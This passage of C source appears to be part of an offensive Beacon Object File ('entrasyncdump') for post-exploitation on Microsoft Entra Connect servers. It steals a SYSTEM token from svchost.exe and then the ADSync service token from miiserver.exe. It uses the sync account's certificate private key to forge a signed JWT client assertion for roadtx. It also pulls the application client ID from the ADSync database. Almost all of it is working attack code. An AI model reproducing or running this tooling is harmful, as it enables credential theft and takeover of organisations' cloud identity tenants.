            if (API(ADVAPI32, GetTokenInformation)(hToken, TokenUser, tokenUserBuf, sizeof(tokenUserBuf), &retLen)) {
                TOKEN_USER* pTokenUser = (TOKEN_USER*)tokenUserBuf;
                // SYSTEM SID is S-1-5-18. Check the last sub-authority == 18 and sub-authority count == 1
                SID* pSid = (SID*)pTokenUser->User.Sid;
                if (pSid->SubAuthorityCount == 1 && pSid->SubAuthority[0] == 18) {
                    // Confirmed SYSTEM
                    gotSystem = TRUE;
                    svchostPid = pe.th32ProcessID;
                    break;
                }
            }

            // Not SYSTEM — close and try next
            API(KERNEL32, CloseHandle)(hToken);
            hToken = NULL;
            API(KERNEL32, CloseHandle)(hProcess);
            hProcess = NULL;
        } while (API(KERNEL32, Process32NextW)(hSnapshot, &pe));
    }

    API(KERNEL32, CloseHandle)(hSnapshot);

    if (!gotSystem || !hToken) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Could not obtain a SYSTEM token from any svchost.exe instance\n");
        if (hToken) API(KERNEL32, CloseHandle)(hToken);
        if (hProcess) API(KERNEL32, CloseHandle)(hProcess);
        return NULL;
    }

    API(KERNEL32, CloseHandle)(hProcess);
    hProcess = NULL;

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Obtained SYSTEM token from svchost.exe (PID: %d)\n", svchostPid);

    // Duplicate and impersonate the SYSTEM token
    if (!API(ADVAPI32, DuplicateTokenEx)(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &hDupToken)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] DuplicateTokenEx (SYSTEM) failed: %d\n", API(KERNEL32, GetLastError)());
        API(KERNEL32, CloseHandle)(hToken);
        return NULL;
    }
    API(KERNEL32, CloseHandle)(hToken);
    hToken = NULL;

    if (!API(ADVAPI32, ImpersonateLoggedOnUser)(hDupToken)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] ImpersonateLoggedOnUser (SYSTEM) failed: %d\n", API(KERNEL32, GetLastError)());
        API(KERNEL32, CloseHandle)(hDupToken);
        return NULL;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Impersonating SYSTEM\n");

    // ---- Stage 2: As SYSTEM, open miiserver.exe token ----
    // SYSTEM has full access to all token DACLs on the box.
    hAdsyncProcess = API(KERNEL32, OpenProcess)(PROCESS_QUERY_INFORMATION, FALSE, adsyncPid);
    if (!hAdsyncProcess) {
        BeaconPrintf(CALLBACK_ERROR, "[-] OpenProcess on miiserver.exe failed as SYSTEM: %d\n", API(KERNEL32, GetLastError)());
        API(ADVAPI32, RevertToSelf)();
        API(KERNEL32, CloseHandle)(hDupToken);
        return NULL;
    }

    if (!API(ADVAPI32, OpenProcessToken)(hAdsyncProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hAdsyncToken)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] OpenProcessToken on miiserver.exe failed as SYSTEM: %d\n", API(KERNEL32, GetLastError)());
        API(KERNEL32, CloseHandle)(hAdsyncProcess);
        API(ADVAPI32, RevertToSelf)();
        API(KERNEL32, CloseHandle)(hDupToken);
        return NULL;
    }

    API(KERNEL32, CloseHandle)(hAdsyncProcess);
    hAdsyncProcess = NULL;

    // Duplicate the ADSync token
    if (!API(ADVAPI32, DuplicateTokenEx)(hAdsyncToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &hAdsyncDupToken)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] DuplicateTokenEx (ADSync) failed: %d\n", API(KERNEL32, GetLastError)());
        API(KERNEL32, CloseHandle)(hAdsyncToken);
        API(ADVAPI32, RevertToSelf)();
        API(KERNEL32, CloseHandle)(hDupToken);
        return NULL;
    }

    API(KERNEL32, CloseHandle)(hAdsyncToken);
    hAdsyncToken = NULL;

    // ---- Stage 3: Drop SYSTEM, impersonate ADSync ----
    API(ADVAPI32, RevertToSelf)();
    API(KERNEL32, CloseHandle)(hDupToken);
    hDupToken = NULL;

    if (!API(ADVAPI32, ImpersonateLoggedOnUser)(hAdsyncDupToken)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] ImpersonateLoggedOnUser (ADSync) failed: %d\n", API(KERNEL32, GetLastError)());
        API(KERNEL32, CloseHandle)(hAdsyncDupToken);
        return NULL;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Impersonating NT SERVICE\\ADSync\n");
    return hAdsyncDupToken;
}

// Read a file from disk into a heap-allocated buffer. Returns NULL on failure.
// Sets *outSize to the number of bytes read.
BYTE* read_file_bytes(CONST WCHAR* path, DWORD* outSize) {
    HANDLE hFile = API(KERNEL32, CreateFileW)(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return NULL;
    }

    DWORD fileSize = API(KERNEL32, GetFileSize)(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
        API(KERNEL32, CloseHandle)(hFile);
        return NULL;
    }

    BYTE* buf = BofHeapAlloc(fileSize);
    if (!buf) {
        API(KERNEL32, CloseHandle)(hFile);
        return NULL;
    }

    DWORD bytesRead = 0;
    if (!API(KERNEL32, ReadFile)(hFile, buf, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        BofHeapFree(buf);
        API(KERNEL32, CloseHandle)(hFile);
        return NULL;
    }

    API(KERNEL32, CloseHandle)(hFile);
    *outSize = fileSize;
    return buf;
}

// Convert a hex character to its nibble value (0-15). Returns -1 on invalid input.
INT hex_nibble(CHAR c) {
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    return -1;
}

// Convert a hex string (e.g. "AABBCC") to raw bytes. Returns bytes written.
// outBuf must be at least strlen(hexStr)/2 bytes.
INT hex_to_bytes(CONST CHAR* hexStr, BYTE* outBuf, INT maxLen) {
    INT len = API(MSVCRT, strlen)(hexStr);
    INT count = 0;
    for (INT i = 0; i + 1 < len && count < maxLen; i += 2) {
        INT hi = hex_nibble(hexStr[i]);
        INT lo = hex_nibble(hexStr[i + 1]);
        if (hi < 0 || lo < 0) return -1;
        outBuf[count++] = (BYTE)((hi << 4) | lo);
    }
    return count;
}

// Base64 encode raw bytes. Returns heap-allocated null-terminated string.
CHAR* base64_encode(CONST BYTE* data, INT len) {
    INT outLen = 4 * ((len + 2) / 3);
    CHAR* out = BofHeapAlloc(outLen + 1);
    if (!out) return NULL;

    INT i, j;
    for (i = 0, j = 0; i < len; ) {
        INT start = i;
        DWORD a = (i < len) ? data[i++] : 0;
        DWORD b = (i < len) ? data[i++] : 0;
        DWORD c = (i < len) ? data[i++] : 0;
        INT consumed = i - start;
        DWORD triple = (a << 16) | (b << 8) | c;

        out[j++] = b64_table[(triple >> 18) & 0x3F];
        out[j++] = b64_table[(triple >> 12) & 0x3F];
        out[j++] = (consumed >= 2) ? b64_table[(triple >> 6) & 0x3F] : '=';
        out[j++] = (consumed >= 3) ? b64_table[triple & 0x3F] : '=';
    }
    out[j] = '\0';
    return out;
}

// Base64URL encode: standard base64 then replace +→-, /→_, strip trailing =
// Returns heap-allocated null-terminated string.
CHAR* base64url_encode(CONST BYTE* data, INT len) {
    CHAR* b64 = base64_encode(data, len);
    if (!b64) return NULL;

    // In-place transform
    for (INT i = 0; b64[i]; i++) {
        if (b64[i] == '+') b64[i] = '-';
        else if (b64[i] == '/') b64[i] = '_';
    }
    // Strip trailing '='
    INT slen = API(MSVCRT, strlen)(b64);
    while (slen > 0 && b64[slen - 1] == '=') {
        b64[--slen] = '\0';
    }
    return b64;
}

// Get current Unix timestamp (seconds since 1970-01-01 UTC)
LONGLONG get_unix_time() {
    FILETIME ft;
    API(KERNEL32, GetSystemTimeAsFileTime)(&ft);
    ULARGE_INTEGER uli;
    uli.LowPart = ft.dwLowDateTime;
    uli.HighPart = ft.dwHighDateTime;
    // FILETIME is 100ns intervals since 1601-01-01. Unix epoch is 1970-01-01.
    // Difference: 116444736000000000 (100ns ticks)
    return (LONGLONG)((uli.QuadPart - 116444736000000000ULL) / 10000000ULL);
}

// Generate a random GUID string (lowercase, no braces) like "550e8400-e29b-41d4-a716-446655440000"
// Uses BCryptGenRandom. Returns heap-allocated string.
CHAR* generate_guid_string() {
    BYTE guidBytes[16];
    NTSTATUS status = API(BCRYPT, BCryptGenRandom)(NULL, guidBytes, 16, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    if (status != 0) {
        return NULL;
    }
    // Set version 4 (random) and variant bits
    guidBytes[6] = (guidBytes[6] & 0x0F) | 0x40; // version 4
    guidBytes[8] = (guidBytes[8] & 0x3F) | 0x80; // variant 1

    CHAR* guid = BofHeapAlloc(37); // 32 hex + 4 dashes + null
    if (!guid) return NULL;
    API(MSVCRT, _snprintf)(guid, 37,
        "%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x",
        guidBytes[0], guidBytes[1], guidBytes[2], guidBytes[3],
        guidBytes[4], guidBytes[5],
        guidBytes[6], guidBytes[7],
        guidBytes[8], guidBytes[9],
        guidBytes[10], guidBytes[11], guidBytes[12], guidBytes[13], guidBytes[14], guidBytes[15]);
    return guid;
}


// ============================================================================
// Subcommand: dumpcert
// Opens the ADSync certificate from the impersonated user's cert store,
// acquires the private key handle via CNG (works for both software and TPM
// keys), builds a JWT, and signs it with NCryptSignHash.
//
// Flow:
//   1. Enable SeDebugPrivilege (requires local admin)
//   2. Single-hop impersonate ADSync via miiserver.exe token theft
//   3. Open ADSync cert store, find cert by thumbprint
//   4. CryptAcquireCertificatePrivateKey → NCrypt key handle
//   5. Build JWT header + claims, SHA256 hash, RSA PKCS#1 sign via NCrypt
//   6. Output base64url assertion for use with roadtx / token request
// ============================================================================
void cmd_dumpcert(CONST CHAR* thumbprint, CONST CHAR* client_id, CONST CHAR* tenant_id) {

    HANDLE hImpToken = NULL;
    BCRYPT_ALG_HANDLE hShaAlg = NULL;
    HCERTSTORE hCertStore = NULL;
    PCCERT_CONTEXT pCertCtx = NULL;
    ULONG_PTR hNcryptKey = 0;
    BOOL fCallerFreeKey = FALSE;
    NTSTATUS status = 0;
    LONG ncStatus = 0;
    CHAR* b64Header = NULL;
    CHAR* b64Claims = NULL;
    CHAR* b64Sig = NULL;
    CHAR* guidStr = NULL;
    CHAR* x5tStr = NULL;

    // ---- Step 1: Parse thumbprint early (needed for cert lookup and x5t) ----
    BYTE thumbBytes[20];
    INT thumbLen = hex_to_bytes(thumbprint, thumbBytes, 20);
    if (thumbLen != 20) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Invalid thumbprint (expected 40 hex chars / 20 bytes, got %d bytes)\n", thumbLen);
        return;
    }

    // ---- Step 2: Enable SeDebugPrivilege ----
    if (!enable_debug_privilege()) {
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] SeDebugPrivilege enabled\n");

    // ---- Step 3: Impersonate ADSync (single-hop via miiserver.exe) ----
    hImpToken = impersonate_adsync();
    if (!hImpToken) {
        return;
    }

    // ---- Step 4: Open the ADSync user's certificate store and find cert ----
    hCertStore = API(CRYPT32, CertOpenStore)(
        CERT_STORE_PROV_SYSTEM_W,
        0, 0,
        CERT_SYSTEM_STORE_CURRENT_USER | CERT_STORE_OPEN_EXISTING_FLAG,
        L"MY");
    if (!hCertStore) {
        BeaconPrintf(CALLBACK_ERROR, "[-] CertOpenStore(MY) failed: %d\n", API(KERNEL32, GetLastError)());
        goto dumpcert_cleanup;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Opened ADSync user certificate store\n");

    CRYPT_HASH_BLOB hashBlob;
    hashBlob.cbData = 20;
    hashBlob.pbData = thumbBytes;

    pCertCtx = API(CRYPT32, CertFindCertificateInStore)(
        hCertStore,
        (DWORD)(0x00000001 | 0x00010000),  // X509_ASN_ENCODING | PKCS_7_ASN_ENCODING
        0,
        CERT_FIND_HASH,
        &hashBlob,
        NULL);
    if (!pCertCtx) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Certificate with thumbprint %s not found in store (error %d)\n",
            thumbprint, API(KERNEL32, GetLastError)());
        goto dumpcert_cleanup;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Found certificate with thumbprint %s\n", thumbprint);

    // ---- Step 5: Acquire the NCrypt private key handle ----
    DWORD dwKeySpec = 0;
    if (!API(CRYPT32, CryptAcquireCertificatePrivateKey)(
            pCertCtx,
            CRYPT_ACQUIRE_ONLY_NCRYPT_KEY_FLAG | CRYPT_ACQUIRE_SILENT_FLAG,
            NULL,
            &hNcryptKey,
            &dwKeySpec,
            &fCallerFreeKey)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] CryptAcquireCertificatePrivateKey failed: %d\n", API(KERNEL32, GetLastError)());
        goto dumpcert_cleanup;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Acquired NCrypt private key handle (KeySpec=%d)\n", dwKeySpec);

    // ---- Query and display CNG key properties ----
    {
        WCHAR propBuf[520];
        DWORD propSize = 0;

        if (API(NCRYPT, NCryptGetProperty)(hNcryptKey, L"Name", (PBYTE)propBuf, sizeof(propBuf), &propSize, 0) == 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] CNG Key Name: %ls\n", propBuf);
        }
        if (API(NCRYPT, NCryptGetProperty)(hNcryptKey, L"Unique Name", (PBYTE)propBuf, sizeof(propBuf), &propSize, 0) == 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] CNG Unique Name: %ls\n", propBuf);
        }
        if (API(NCRYPT, NCryptGetProperty)(hNcryptKey, L"Algorithm Group", (PBYTE)propBuf, sizeof(propBuf), &propSize, 0) == 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Algorithm Group: %ls\n", propBuf);
        }
        if (API(NCRYPT, NCryptGetProperty)(hNcryptKey, L"Provider Handle", (PBYTE)propBuf, sizeof(propBuf), &propSize, 0) == 0) {
            ULONG_PTR hProv = *(ULONG_PTR*)propBuf;
            WCHAR provName[260];
            DWORD provNameSize = 0;
            if (API(NCRYPT, NCryptGetProperty)(hProv, L"Name", (PBYTE)provName, sizeof(provName), &provNameSize, 0) == 0) {
                BeaconPrintf(CALLBACK_OUTPUT, "[+] Provider: %ls\n", provName);
            }
        }
    }

    // ---- Step 6: Build JWT assertion ----
    x5tStr = base64url_encode(thumbBytes, 20);
    if (!x5tStr) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to base64url encode thumbprint\n");
        goto dumpcert_cleanup;
    }

    CHAR jwtHeader[JWT_MAX_HEADER];
    API(MSVCRT, _snprintf)(jwtHeader, JWT_MAX_HEADER,
        "{\"typ\":\"JWT\",\"alg\":\"RS256\",\"x5t\":\"%s\"}", x5tStr);

    LONGLONG now = get_unix_time();
    LONGLONG exp = now + 300;
    guidStr = generate_guid_string();
    if (!guidStr) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to generate GUID for jti\n");
        goto dumpcert_cleanup;
    }

    CHAR jwtAud[512];
    API(MSVCRT, _snprintf)(jwtAud, 512, JWT_AUD_FMT, tenant_id);

    CHAR jwtClaims[JWT_MAX_CLAIMS];
    API(MSVCRT, _snprintf)(jwtClaims, JWT_MAX_CLAIMS,
        "{\"iss\":\"%s\",\"aud\":\"%s\",\"iat\":%lld,\"nbf\":%lld,\"exp\":%lld,\"jti\":\"%s\",\"sub\":\"%s\"}",
        client_id, jwtAud, now, now, exp, guidStr, client_id);

    b64Header = base64url_encode((CONST BYTE*)jwtHeader, API(MSVCRT, strlen)(jwtHeader));
    b64Claims = base64url_encode((CONST BYTE*)jwtClaims, API(MSVCRT, strlen)(jwtClaims));
    if (!b64Header || !b64Claims) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to base64url encode JWT components\n");
        goto dumpcert_cleanup;
    }

    CHAR sigInput[JWT_MAX_ASSERTION];
    API(MSVCRT, _snprintf)(sigInput, JWT_MAX_ASSERTION, "%s.%s", b64Header, b64Claims);
    INT sigInputLen = API(MSVCRT, strlen)(sigInput);

    // ---- SHA256 hash the signing input ----
    BYTE sha256Hash[32];
    status = API(BCRYPT, BCryptOpenAlgorithmProvider)(&hShaAlg, L"SHA256", NULL, 0);
    if (status != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] BCryptOpenAlgorithmProvider(SHA256) failed: 0x%08x\n", status);
        goto dumpcert_cleanup;
    }
    status = API(BCRYPT, BCryptHash)(hShaAlg, NULL, 0,
        (PUCHAR)sigInput, sigInputLen, sha256Hash, 32);
    if (status != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] BCryptHash(SHA256) failed: 0x%08x\n", status);
        goto dumpcert_cleanup;
    }

    // ---- RSA PKCS#1 v1.5 sign the hash via NCrypt ----
    MY_BCRYPT_PKCS1_PADDING_INFO padInfo;
    padInfo.pszAlgId = L"SHA256";

    DWORD sigLen = 0;
    ncStatus = API(NCRYPT, NCryptSignHash)(hNcryptKey, &padInfo, sha256Hash, 32,
        NULL, 0, &sigLen, BCRYPT_PAD_PKCS1);
    if (ncStatus != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] NCryptSignHash (size query) failed: 0x%08x\n", ncStatus);
        goto dumpcert_cleanup;
    }

    BYTE* sigBuf = BofHeapAlloc(sigLen);
    if (!sigBuf) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate signature buffer\n");
        goto dumpcert_cleanup;
    }

    ncStatus = API(NCRYPT, NCryptSignHash)(hNcryptKey, &padInfo, sha256Hash, 32,
        sigBuf, sigLen, &sigLen, BCRYPT_PAD_PKCS1);
    if (ncStatus != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] NCryptSignHash failed: 0x%08x\n", ncStatus);
        BofHeapFree(sigBuf);
        goto dumpcert_cleanup;
    }

    b64Sig = base64url_encode(sigBuf, sigLen);
    BofHeapFree(sigBuf);
    if (!b64Sig) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to base64url encode signature\n");
        goto dumpcert_cleanup;
    }

    // ---- Step 7: Output the complete assertion ----
    BeaconPrintf(CALLBACK_OUTPUT,
        "\n[+] Authentication assertion for roadtx:\n%s.%s.%s\n",
        b64Header, b64Claims, b64Sig);

    BeaconPrintf(CALLBACK_OUTPUT,
        "\n[+] Parameters for token request:\n"
        "    Thumbprint: %s\n"
        "    Client ID:  %s\n"
        "    Tenant ID:  %s\n",
        thumbprint, client_id, tenant_id);


dumpcert_cleanup:
    if (b64Sig) BofHeapFree(b64Sig);
    if (b64Claims) BofHeapFree(b64Claims);
    if (b64Header) BofHeapFree(b64Header);
    if (guidStr) BofHeapFree(guidStr);
    if (x5tStr) BofHeapFree(x5tStr);
    if (hShaAlg) API(BCRYPT, BCryptCloseAlgorithmProvider)(hShaAlg, 0);
    if (hNcryptKey && fCallerFreeKey) API(NCRYPT, NCryptFreeObject)(hNcryptKey);
    if (pCertCtx) API(CRYPT32, CertFreeCertificateContext)(pCertCtx);
    if (hCertStore) API(CRYPT32, CertCloseStore)(hCertStore, 0);
    if (hImpToken) {
        API(ADVAPI32, RevertToSelf)();
        API(KERNEL32, CloseHandle)(hImpToken);
    }
}


// Subcommand: version
// Reads version info from the Entra Connect executable and determines the SQL instance name.
void cmd_version() {
    ENTRACONNECT_VERSION ver = { 0 };

    if (!read_entra_version(&ver)) {
        BeaconPrintf(CALLBACK_ERROR,
            "Could not find or read Entra Connect / AzureADConnect installation.\n"
            "Checked:\n"
            "  C:\\Program Files\\Microsoft Azure Active Directory Connect\\ADSync\\Bin\\ADSync.exe\n"
            "  C:\\Program Files\\Microsoft Azure Active Directory Connect\\AzureADConnect.exe\n"
        );
        return;
    }

    CONST WCHAR* sqlInstance = find_localdb_instance();

    CONST CHAR* authNote = NULL;
    CONST CHAR* authType = classify_auth_type(&ver, &authNote);

    CHAR verStr[32];
    API(MSVCRT, sprintf)(verStr, "%d.%d.%d.%d", ver.major, ver.minor, ver.build, ver.revision);

    BeaconPrintf(CALLBACK_OUTPUT,
        "Entra Connect version: %s\n"
        "File: %ls\n"
        "SQL LocalDB instance: %ls\n"
        "Auth type: %s\n"
        "Note: %s\n",
        verStr, ver.filePath,
        sqlInstance ? sqlInstance : L"(not found - check ServiceProfiles\\ADSync LocalDB path)",
        authType, authNote
    );
}


// Subcommand: dumpcertinfo
// Checks if ABA/certificate auth could be in use, enumerates the ADSync certificate store,
// and queries the SQL database for the application/client ID used for ABA.
// overrideInstance: optional wide-string instance name. NULL = auto-discover.
void cmd_dumpcertinfo(CONST WCHAR* overrideInstance) {

    // --- Version check: only continue if ABA could be enabled ---
    ENTRACONNECT_VERSION ver = { 0 };

    if (!read_entra_version(&ver)) {
        BeaconPrintf(CALLBACK_ERROR,
            "Could not find or read Entra Connect installation - cannot determine auth type.\n"
        );
        return;
    }

    CHAR verStr[32];
    API(MSVCRT, sprintf)(verStr, "%d.%d.%d.%d", ver.major, ver.minor, ver.build, ver.revision);

    if (ver.major < ENTRACONNECT_V2_MAJOR || (ver.major == 2 && ver.minor < ENTRACONNECT_ABA_PREVIEW_MINOR)) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "Entra Connect version %s does not support Application-Based Authentication.\n"
            "This installation uses password-based auth only (no certificate/ABA info to extract).\n",
            verStr
        );
        return;
    }

    CONST CHAR* authNote = NULL;
    CONST CHAR* authType = classify_auth_type(&ver, &authNote);
    BeaconPrintf(CALLBACK_OUTPUT,
        "Entra Connect version %s detected.\n"
        "Auth type: %s\n"
        "Continuing to check for certificate material...\n\n",
        verStr, authType
    );


    // --- Enumerate certificate thumbprints from the ADSync certificate store ---
    // Each file in this directory is named by its SHA-1 thumbprint (40 hex chars).
    WIN32_FIND_DATAW findData = { 0 };
    HANDLE hFind = API(KERNEL32, FindFirstFileW)(CERT_DIR_SEARCH, &findData);

    INT certCount = 0;

    if (hFind == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] No certificates found (or directory inaccessible): %ls\n"
            "    Error: %d\n"
            "    If ABA is configured, certificate material should be present here.\n",
            CERT_DIR, API(KERNEL32, GetLastError)()
        );
        goto query_clientid;
    }

    // First pass: count certs (skip . and ..)
    do {
        if (findData.cFileName[0] == L'.') continue;
        certCount++;
    } while (API(KERNEL32, FindNextFileW)(hFind, &findData));

    API(KERNEL32, FindClose)(hFind);

    if (certCount == 0) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] No certificates found in ADSync certificate store: %ls\n"
            "    If ABA is configured, certificate material should be present here.\n",
            CERT_DIR
        );
    } else if (certCount == 1) {
        // Single cert - green / expected for ABA
        hFind = API(KERNEL32, FindFirstFileW)(CERT_DIR_SEARCH, &findData);
        // Skip to the non-dot entry
        do {
            if (findData.cFileName[0] != L'.') break;
        } while (API(KERNEL32, FindNextFileW)(hFind, &findData));
        API(KERNEL32, FindClose)(hFind);

        BeaconPrintf(CALLBACK_OUTPUT,
            "[+] Found 1 certificate in ADSync certificate store (expected for ABA).\n"
            "    Thumbprint: %ls\n"
            "    Path: %ls\n",
            findData.cFileName, CERT_DIR
        );
    } else {
        // Multiple certs - unexpected, raise warning
        BeaconPrintf(CALLBACK_OUTPUT,
            "[!] WARNING: Found %d certificates in ADSync certificate store - expected 1 for ABA.\n"
            "    Multiple certificates may indicate a rotation in progress or a misconfiguration.\n"
            "    Path: %ls\n",
            certCount, CERT_DIR
        );

        hFind = API(KERNEL32, FindFirstFileW)(CERT_DIR_SEARCH, &findData);
        do {
            if (findData.cFileName[0] == L'.') continue;
            BeaconPrintf(CALLBACK_OUTPUT, "    Thumbprint: %ls\n", findData.cFileName);
        } while (API(KERNEL32, FindNextFileW)(hFind, &findData));
        API(KERNEL32, FindClose)(hFind);
    }


query_clientid:
    // --- Extract application/client ID from the ADSync SQL database ---
    // No impersonation needed — the (LocalDB) shared-instance resolution breaks
    // under thread impersonation for NT SERVICE\* owned instances.
    ;  // label requires a statement

    BOOL sqlConnected     = FALSE;
    SQLHENV sqlEnvHandle  = NULL;
    SQLHDBC sqlConnHandle = NULL;
    SQLHSTMT sqlStmtHandle = NULL;
    SQLRETURN sqlResult;
    WCHAR sqlDriverList[1024];
    WCHAR* sqlDriverName       = NULL;
    WCHAR* sqlConnectionString = NULL;
    CONST WCHAR* sqlInstanceName = resolve_localdb_instance(overrideInstance);
    if (!sqlInstanceName) {
        BeaconPrintf(CALLBACK_ERROR,
            "Could not determine LocalDB instance name.\n"
            "Pass the instance name explicitly: entrasyncdump dumpcertinfo <instancename>\n"
        );
        goto cert_cleanup;
    }

    SQLCHAR* adSyncPrivateConfig = NULL;
    CONST CHAR* clientId         = NULL;

    // SQL setup
    sqlResult = API(ODBC32, SQLAllocHandle)(SQL_HANDLE_ENV, SQL_NULL_HANDLE, &sqlEnvHandle);
    if (!IS_SQL_SUCCESS(sqlResult)) { BeaconPrintf(CALLBACK_ERROR, "Failed to allocate SQL env handle.\n"); goto cert_cleanup; }

    sqlResult = API(ODBC32, SQLSetEnvAttr)(sqlEnvHandle, SQL_ATTR_ODBC_VERSION, (SQLPOINTER*)SQL_OV_ODBC3, 0);
    if (!IS_SQL_SUCCESS(sqlResult)) { BeaconPrintf(CALLBACK_ERROR, "Failed to set ODBC version.\n"); goto cert_cleanup; }

    if (!API(ODBCCP32, SQLGetInstalledDriversW)(sqlDriverList, sizeof(sqlDriverList) / sizeof(WCHAR), NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to obtain SQL driver list.\n");
        goto cert_cleanup;
    }

    for (CONST WCHAR* driver = sqlDriverList; *driver; driver += API(MSVCRT, wcslen)(driver) + 1) {
        if (API(MSVCRT, wcsstr)(driver, L"ODBC Driver ") && API(MSVCRT, wcsstr)(driver, L"for SQL Server")) {
            sqlDriverName = driver;
            break;
        }
    }

    if (!sqlDriverName) { BeaconPrintf(CALLBACK_ERROR, "No suitable ODBC SQL Server driver found.\n"); goto cert_cleanup; }

    sqlConnectionString = BofHeapAlloc((API(MSVCRT, wcslen)(sqlDriverName) + API(MSVCRT, wcslen)(sqlInstanceName)) * sizeof(WCHAR) + sizeof(CONNECTION_STRING_FMT));
    if (!sqlConnectionString) { BeaconPrintf(CALLBACK_ERROR, "Failed to allocate SQL connection string.\n"); goto cert_cleanup; }
    API(USER32, wsprintfW)(sqlConnectionString, CONNECTION_STRING_FMT, sqlDriverName, sqlInstanceName);

    sqlResult = API(ODBC32, SQLAllocHandle)(SQL_HANDLE_DBC, sqlEnvHandle, &sqlConnHandle);
    if (!IS_SQL_SUCCESS(sqlResult)) { BeaconPrintf(CALLBACK_ERROR, "Failed to allocate SQL connection handle.\n"); goto cert_cleanup; }

    sqlResult = API(ODBC32, SQLSetConnectAttrW)(sqlConnHandle, SQL_LOGIN_TIMEOUT, (SQLPOINTER)CONNECT_TIMEOUT, 0);
    if (!IS_SQL_SUCCESS(sqlResult)) { BeaconPrintf(CALLBACK_ERROR, "Failed to set SQL timeout.\n"); goto cert_cleanup; }

    sqlResult = API(ODBC32, SQLDriverConnectW)(sqlConnHandle, NULL, sqlConnectionString, SQL_NTS, NULL, 0, NULL, SQL_DRIVER_NOPROMPT);
    if (!IS_SQL_SUCCESS(sqlResult)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to connect to ADSync database. %ls\n", get_last_sql_error(sqlConnHandle, sqlResult));
        goto cert_cleanup;
    }
    sqlConnected = TRUE;

    sqlResult = API(ODBC32, SQLAllocHandle)(SQL_HANDLE_STMT, sqlConnHandle, &sqlStmtHandle);
    if (!IS_SQL_SUCCESS(sqlResult)) { BeaconPrintf(CALLBACK_ERROR, "Failed to allocate SQL statement handle.\n"); goto cert_cleanup; }

    sqlResult = API(ODBC32, SQLExecDirectW)(sqlStmtHandle, QUERY_PRIVATE_CONFIG, SQL_NTS);
    if (!IS_SQL_SUCCESS(sqlResult)) { BeaconPrintf(CALLBACK_ERROR, "Failed to execute private config query.\n"); goto cert_cleanup; }

    adSyncPrivateConfig = BofHeapAlloc(CONFIG_SIZE * sizeof(SQLCHAR));
    if (!adSyncPrivateConfig) { BeaconPrintf(CALLBACK_ERROR, "Failed to allocate private config buffer.\n"); goto cert_cleanup; }

    sqlResult = API(ODBC32, SQLBindCol)(sqlStmtHandle, 1, SQL_C_CHAR, adSyncPrivateConfig, CONFIG_SIZE * sizeof(SQLCHAR), NULL);
    if (!IS_SQL_SUCCESS(sqlResult)) { BeaconPrintf(CALLBACK_ERROR, "Failed to bind private config column.\n"); goto cert_cleanup; }

    sqlResult = API(ODBC32, SQLFetch)(sqlStmtHandle);
    if (!IS_SQL_SUCCESS(sqlResult)) { BeaconPrintf(CALLBACK_ERROR, "Failed to fetch private config.\n"); goto cert_cleanup; }

    // Try to extract the ABA application/client ID from the config XML.
    // First check for a dedicated "ApplicationId" parameter (ABA installs).
    // If not found, fall back to the "UserName" parameter — on ABA installs
    // the username is the client ID in UPN format: {GUID}@tenant.onmicrosoft.com.
    clientId = find_clientid(adSyncPrivateConfig);

    if (!clientId) {
        // No explicit ApplicationId — check if UserName contains a GUID-style client ID
        CONST CHAR* username = find_username(adSyncPrivateConfig);
        if (username && username[0] == '{') {
            // UserName is {GUID}@tenant — that GUID is the client/application ID
            clientId = username;
        } else {
            if (username) BofHeapFree(username);
        }
    }

    if (clientId) {
        BeaconPrintf(CALLBACK_OUTPUT, "\n[+] Application/Client ID (ABA): %s\n", clientId);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT,
            "\n[!] No Application/Client ID found in private_configuration_xml.\n"
            "    This is expected for password-based installs (Sync_*/MSOL_* accounts).\n"
        );
    }


cert_cleanup:
    if (clientId) BofHeapFree(clientId);
